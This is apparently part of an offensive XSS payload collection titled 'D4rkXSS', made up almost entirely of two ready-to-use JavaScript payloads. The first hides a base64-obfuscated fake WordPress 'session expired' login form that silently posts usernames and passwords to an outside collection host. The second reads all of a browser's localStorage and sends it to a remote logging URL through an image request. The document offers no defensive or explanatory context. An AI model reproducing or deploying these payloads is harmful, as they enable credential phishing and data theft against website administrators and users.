# MISC - D4rkXSS

## WordPress Credentials Theft
<li>Payload</li>

```
onmouseover="this.style.display='none';
if (document.cookie.indexOf('visited')>=0) {}
else {
   document.getElementById('wpwrap').innerHTML=atob('PGxpbmsgcmVsPSdzdHlsZXNoZWV0JyBpZD0nY29sb3JzLWZyZXNoLWNzcycgIGhyZWY9J2Nzcy9jb2xvcnMtZnJlc2guY3NzJyB0eXBlPSd0ZXh0L2NzcycgbWVkaWE9J2FsbCcgLz4KPGxpbmsgcmVsPSdzdHlsZXNoZWV0JyBpZD0nbG9naW4tY3NzJyAgaHJlZj0nY3NzL2xvZ2luLmNzcycgdHlwZT0ndGV4dC9jc3MnIG1lZGlhPSdhbGwnIC8+Cgo8c3R5bGU+CmJvZHkgewoJYmFja2dyb3VuZDogbm9uZTsKfQojaGVhZGVyIHsKCWJhY2tncm91bmQ6IG5vbmU7Cn0KI2xvZ2luZm9ybSB7Cgl0ZXh0LWFsaWduOiBsZWZ0Owp9CnAgI25hdiB7Cgl0ZXh0LXNoYWRvdzogcmdiYSgyNTUsMjU1LDI1NSwxKSAwIDFweCAwOwp9Ci5zdWJtaXQgewoJcGFkZGluZzogMDsKfQojYmFja3RvYmxvZyBhIHsKCWNvbG9yOiAjY2NjOwp9Cjwvc3R5bGU+Cgo8ZGl2IGlkPSJsb2dpbiI+PGgxPjxhIGhyZWY9Imh0dHA6Ly93b3JkcHJlc3Mub3JnLyIgdGl0bGU9IlBvd2VyZWQgYnkgV29yZFByZXNzIj5UcmlwZSBMb3ZlcidzIEJsb2c8L2E+PC9oMT4KCjxmb3JtIG5hbWU9ImxvZ2luZm9ybSIgaWQ9ImxvZ2luZm9ybSIgYWN0aW9uPSJodHRwOi8vd3d3Lm1hbGxvcnkuaW52YWxpZC9jb2xsZWN0LnBocCIgbWV0aG9kPSJQT1NUIiB0YXJnZXQ9ImhpZGRlbi1mb3JtIj4KCTxwPgoJCTxsYWJlbD5Vc2VybmFtZTxiciAvPgoJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1IiBpZD0idXNlcl9sb2dpbiIgY2xhc3M9ImlucHV0IiB2YWx1ZT0iIiBzaXplPSIyMCIgdGFiaW5kZXg9IjEwIiAvPjwvbGFiZWw+Cgk8L3A+Cgk8cD4KCQk8bGFiZWw+UGFzc3dvcmQ8YnIgLz4KCQk8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiIGlkPSJ1c2VyX3Bhc3MiIGNsYXNzPSJpbnB1dCIgdmFsdWU9IiIgc2l6ZT0iMjAiIHRhYmluZGV4PSIyMCIgLz48L2xhYmVsPgoJPC9wPgoJPHAgc3R5bGU9ImNvbG9yOnJlZCI+U2Vzc2lvbiBoYXMgZXhwaXJlZCwgcGxlYXNlIGxvZyBpbjwvcD4KCTxwIGNsYXNzPSJmb3JnZXRtZW5vdCI+PGxhYmVsPjxpbnB1dCBuYW1lPSJyZW1lbWJlcm1lIiB0eXBlPSJjaGVja2JveCIgaWQ9InJlbWVtYmVybWUiIHZhbHVlPSJmb3JldmVyIiB0YWJpbmRleD0iOTAiIC8+IFJlbWVtYmVyIE1lPC9sYWJlbD48L3A+Cgk8cCBjbGFzcz0ic3VibWl0Ij4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJ3cC1zdWJtaXQiIGlkPSJ3cC1zdWJtaXQiIHZhbHVlPSJMb2cgSW4iIHRhYmluZGV4PSIxMDAiIC8+Cgk8L3A+CjwvZm9ybT4KCjxwIGlkPSJuYXYiPgo8YSBocmVmPSIuLi93cC1sb2dpbi5waHA/YWN0aW9uPWxvc3RwYXNzd29yZCIgdGl0bGU9IlBhc3N3b3JkIExvc3QgYW5kIEZvdW5kIj5Mb3N0IHlvdXIgcGFzc3dvcmQ/PC9hPgo8L3A+Cgo8L2Rpdj4KCjxwIGlkPSJiYWNrdG9ibG9nIj48YSBocmVmPSIvYmxvZyIgdGl0bGU9IkFyZSB5b3UgbG9zdD8iPiZsYXJyOyBCYWNrIHRvIFRyaXBlIExvdmVyJ3MgQmxvZzwvYT48L3A+Cgo8aWZyYW1lIHN0eWxlPSJkaXNwbGF5Om5vbmUiIG5hbWU9ImhpZGRlbi1mb3JtIj48L2lmcmFtZT4KCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KdHJ5e2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VyX2xvZ2luJykuZm9jdXMoKTt9Y2F0Y2goZSl7fQo8L3NjcmlwdD4K');
   document.getElementById('wpwrap').id='login';
   document.getElementById('footer').innerHTML='';
   document.cookie='visited=true;path=/;max-age='+60*10;
 };
```

## Local Storage Leak
<li>Payload</li>

```
if (window.localStorage) {
    if (localStorage.length) {
            var output;
            for (var i = 0; i < localStorage.length; i++) {
                    if(i>0) { output += "&"; }
                    output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
            }
            new Image().src = 'http://remote.com/log.php?'+output;
	}
}

```

